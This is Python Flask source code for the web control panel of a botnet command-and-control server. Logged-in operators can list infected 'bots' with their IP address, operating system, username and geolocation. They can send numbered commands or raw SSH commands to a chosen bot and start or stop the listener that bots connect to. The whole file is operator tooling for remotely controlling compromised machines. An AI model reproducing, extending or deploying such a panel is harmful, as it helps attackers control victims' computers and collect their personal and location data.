# Date: 07/02/2018
# Author: Pure-L0G1C
# Description: Web server

import re
from os import urandom
from lib import database, const
from flask_wtf import CSRFProtect
from string import ascii_uppercase
from lib.server.server import Server
from flask import Flask, render_template, request, session, jsonify, redirect, url_for, escape

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
app.config['SECRET_KEY'] = urandom(0x200)  # cookie encryption

# Protection against CSRF attack
CSRFProtect(app)

# server
server = Server()
db = database.Database()


def get_bot(bot_id):
    bots = server.interface.bots
    for bot_session in bots:
        if bots[bot_session]['bot_id'] == bot_id:
            return bots[bot_session]


def login_required(func):
    def wrapper(*args, **kwargs):
        if not 'logged_in' in session:
            return redirect(url_for('index'))
        elif not session['logged_in']:
            return redirect(url_for('index'))
        else:
            return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper


def bot_required(func):
    def wrapper(*args, **kwargs):
        if not 'bot_id' in session:
            return jsonify({'resp': ''})
        if not get_bot(session['bot_id']):
            return jsonify({'resp': ''})
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper


# Usernames & Passwords

def is_valid_username(username):
    username = username.strip()
    resp = {'status': 0, 'msg': ''}

    if len(username) == 0:
        return resp

    if len(username) < const.MIN_USERNAME_LENGTH:
        resp['msg'] = 'Username must contain at least ' + \
            const.MIN_PASSWORD_LENGTH + ' characters'
        return resp
    elif len(username) > const.MAX_USERNAME_LENGTH:
        resp['msg'] = 'Username must contain at most ' + \
            const.MAX_USERNAME_LENGTH + 'characters'
        return resp

    if re.findall(r'\W', username):
        resp['msg'] = 'Username must not contain a special or space character'
        return resp

    resp['status'] = 1
    return resp


def is_valid_password(password):
    _password = password
    password = password.strip()
    resp = {'status': 0, 'msg': ''}

    if len(password) == 0:
        return resp

    # Length

    if len(password) < const.MIN_PASSWORD_LENGTH:
        resp['msg'] = 'Password must contain at least ' + \
            const.MIN_PASSWORD_LENGTH + ' characters'
        return resp

    elif len(password) > const.MAX_PASSWORD_LENGTH:
        resp['msg'] = 'Password must contain at most ' + \
            const.MAX_PASSWORD_LENGTH + ' characters'
        return resp

    # Diversity

    if re.findall(r'^\d+\d$', password):
        resp['msg'] = 'Password must not only consist of numbers'
        return resp

    if not re.findall(r'\d', password):
        resp['msg'] = 'Password must contain a number'
        return resp

    if not re.findall(r'\w', password):
        resp['msg'] = 'Password must contain a letter'
        return resp

    # Spaces

    if re.findall(r'^\s|\s$', _password):
        resp['msg'] = 'Password must not start or end with a space'
        return resp

    if not re.findall(r'\s', password):
        resp['msg'] = 'Password must contain a space'
        return resp

    if re.findall(r'\s{2,}', password):
        resp['msg'] = 'Password must not consist of consecutive spaces'
        return resp

    resp['status'] = 1
    return resp


# -------- Endpoints -------- #

@app.route('/')
def index():
    if not 'logged_in' in session:
        session['logged_in'] = False
        return render_template('index.html')
    if not session['logged_in']:
        return render_template('index.html')
    return render_template('home.html')


@app.route('/settings')
@login_required
def settings():
    return render_template('settings.html')


def start_bot_services(bot_id):
    if not 'bot_id' in session or session['bot_id'] != bot_id:
        session['bot_id'] = bot_id
        server.interface.ssh_obj(bot_id)


@app.route('/control/cmd', methods=['POST'])
@login_required
@bot_required
def control_cmd():
    if not 'cmd_id' in request.form or not 'args[]' in request.form:
        return jsonify({'resp': 'Supply both cmd_id and args[]'})

    cmd_id = request.form['cmd_id']
    args = request.form.getlist('args[]')

    if not cmd_id.isdigit():
        return jsonify({'resp': 'cmd_id must be an int type'})

    if not 'bot_id' in session:
        return jsonify({'resp': 'A bot must be selected'})

    if not get_bot(session['bot_id']):
        return jsonify({'resp': ''})

    resp = server.interface.execute_cmd_by_id(session['bot_id'], cmd_id, args)
    return jsonify({'resp': resp})


@app.route('/control/ssh', methods=['POST'])
@login_required
@bot_required
def control_ssh():
    if not 'cmd' in request.form:
        return jsonify({'resp': 'Please provide cmd argument'})

    cmd = request.form['cmd'].strip()

    if not 'bot_id' in session:
        return jsonify({'resp': 'A bot must be selected'})

    if not get_bot(session['bot_id']):
        return jsonify({'resp': ''})

    return jsonify({'resp': server.interface.ssh_exe(cmd)})


@app.route('/get-bot-info', methods=['POST'])
@login_required
def get_bot_info():
    if not 'bot-id' in request.form:
        return jsonify({'status': -1, 'msg': 'bot-id is required'})

    bot_id = request.form['bot-id']
    bot = server.interface.get_bot(bot_id)

    if not bot:
        return jsonify({'status': -1, 'msg': 'No bot is available by that id'})

    start_bot_services(bot_id)

    net_info = bot['intel']['net_info']
    sys_info = bot['intel']['sys_info']

    data = {
        'system': {
            'OS': sys_info['system'] + ' ' + sys_info['release'],
            'OS Version':  sys_info['version'],
            'Hostname': sys_info['hostname'],
            'Username': sys_info['username'].title(),
        },
        'network': {
            'ISP': net_info['isp'].title(),
            'Internal IP': net_info['internalIp'],
            'External IP': net_info['query'],
        },
        'geolocation': {
            'Country': net_info['country'].title(),
            'Region': net_info['regionName'].title(),
            'City': net_info['city'].title(),
            'Zip': net_info['zip'],
            'Latitude': net_info['lat'],
            'Longitude': net_info['lon'],
            'Timezone': net_info['timezone'],
        }
    }

    return jsonify({'status': 0, 'data': data})


@app.route('/fetch-bots', methods=['GET'])
@login_required
def fetch_bots():

    online_bots = []
    bots = server.interface.bots

    for bot in bots:
        online_bots.append({
            'id': bots[bot]['bot_id'],
            'ip': bots[bot]['intel']['net_info']['query'],
            'os': bots[bot]['intel']['sys_info']['system'],
            'country': bots[bot]['intel']['net_info']['country'],
        })

    return jsonify({
        'bots': online_bots,
        'signature': server.interface.sig
    })


@app.route('/server-status', methods=['GET'])
@login_required
def server_status():
    status = {
        'isActive': server.is_active
    }

    if server.is_active:
        status['ip'] = server.ip
        status['port'] = server.port

    return jsonify(status)


@app.route('/get-account-status', methods=['GET'])
@login_required
def get_default_creds_status():
    status = {
        'msg': db.get_account_status(session['user_id'], session['username'])
    }

    return jsonify(status)


@app.route('/update-username-password', methods=['POST'])
@login_required
def update_username_password():
    resp = {
        'new-username': {'status': 0, 'msg': ''},
        'current-password': {'status': 0, 'msg': ''},
        'new-password': {'status': 0, 'msg': ''},
        'confirm-password': {'status': 0, 'msg': ''}
    }

    if (not 'newUsername' in request.form or
        not 'currentPassword' in request.form or
        not 'newPassword' in request.form or
            not 'confirmPassword' in request.form):
        return jsonify({'resp': 'Please provide all argument'})

    new_username = request.form['newUsername']
    current_password = request.form['currentPassword']
    new_password = request.form['newPassword']
    confirm_password = request.form['confirmPassword']

    if len(current_password) == 0 and len(new_username) == 0:
        return jsonify(resp)

    new_password_resp = is_valid_password(new_password)
    new_username_resp = is_valid_username(new_username)

    if len(current_password):
        if not db.compare_passwords(session['user_id'], current_password):
            resp['current-password']['msg'] = 'Please provide the correct password'
        else:
            if new_password_resp['status'] == 0:
                resp['new-password']['msg'] = new_password_resp['msg']
            else:
                if new_password != confirm_password:
                    resp['confirm-password']['msg'] = 'Passwords do not match'
                else:
                    db.update_password(session['user_id'], new_password)
                    resp['new-password']['msg'] = 'Password has been updated'
                    resp['new-password']['status'] = 1

    if len(new_username):
        if new_username_resp['status'] == 0:
            resp['new-username']['msg'] = new_username_resp['msg']
        else:
            if not db.account_exists(new_username):
                db.update_username(session['user_id'], new_username)
                resp['new-username']['msg'] = 'Username has been updated'
                session['username'] = new_username.lower()
                resp['new-username']['status'] = 1
            else:
                resp['new-username']['msg'] = 'Must be a new username'

    session['account_status'] = db.get_account_status(
        session['user_id'], session['username'])

    return jsonify(resp)


def valid_ip(ip):
    if not re.match(r'^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$', ip):
        return False
    if ip != const.PRIVATE_IP:
        return False
    return True


def valid_port(port):
    _port = str(port).strip()

    if not len(_port):
        return False
    else:
        #  check if number
        for item in _port:
            if not item.isdigit():
                return False

        # check if number starts with a zero
        if int(_port[0]) == 0:
            return False

        # check if number is larger than 65535
        if int(_port) > 65535:
            return False

        if any([int(_port) == const.FTP_PORT, int(_port) == const.SSH_PORT]):
            return False
        return True


def server_start(ip, port):
    session['ip'] = ip
    session['port'] = port
    session['server_active'] = True
    return server.start(ip, port)


def server_stop():
    session['ip'] = None
    session['port'] = None
    session['server_active'] = False
    return not server.stop()


@app.route('/start-server', methods=['POST'])
@login_required
def start_server():

    if not 'ip' in request.form or not 'port' in request.form:
        return jsonify({'status': -1, 'msg': 'Provide an IP and a Port'})

    ip = request.form['ip']
    port = request.form['port']

    if not valid_ip(ip):
        return jsonify({'status': -1, 'msg': 'Invalid IP'})

    if not valid_port(port):
        return jsonify({'status': -1, 'msg': 'Invalid port'})

    if not server.is_active or not session['server_active']:
        if server_start(ip, port):
            return jsonify({'status': 0, 'msg': 'Successfully started server'})
        return jsonify({'status': -1, 'msg': 'Failed to start server'})

    return jsonify({'status': -1, 'msg': 'Server is already active'})


@app.route('/stop-server', methods=['POST'])
@login_required
def stop_server():
    if server.is_active or session['server_active']:
        if server_stop():
            return jsonify({'status': 0, 'msg': 'Successfully stopped server'})
        return jsonify({'status': -1, 'msg': 'Failed to stop server'})

    return jsonify({'status': -1, 'msg': 'Server is already inactive'})


@app.route('/login', methods=['GET', 'POST'])
def login():
    if not 'logged_in' in session:
        return redirect(url_for('index'))

    if session['logged_in']:
        return redirect(url_for('index'))

    if not ('username' in request.form and 'password' in request.form):
        return jsonify({'is_authenticated': False, 'msg': 'Provide all requirements'})

    username = escape(request.form.get('username').strip())
    password = escape(request.form.get('password'))

    if not len(username) or not len(password):
        return jsonify({'is_authenticated': False, 'msg': 'Username and password required'})

    # attempt to login
    user_id = db.authenticate(username, password)

    if not user_id:
        return jsonify({'is_authenticated': False, 'msg': 'Incorret username or password'})

    session['logged_in'] = True
    session['user_id'] = user_id
    session['username'] = username.title()

    # server
    session['server_active'] = False
    session['port'] = None
    session['ip'] = None

    if server.is_active:
        server_start(server.ip, server.port)

    session['account_status'] = db.get_account_status(user_id, username)

    return jsonify({'is_authenticated': True, 'msg': ''})


@app.route('/logout')
@login_required
def logout():
    session.clear()
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run()
    server.stop()
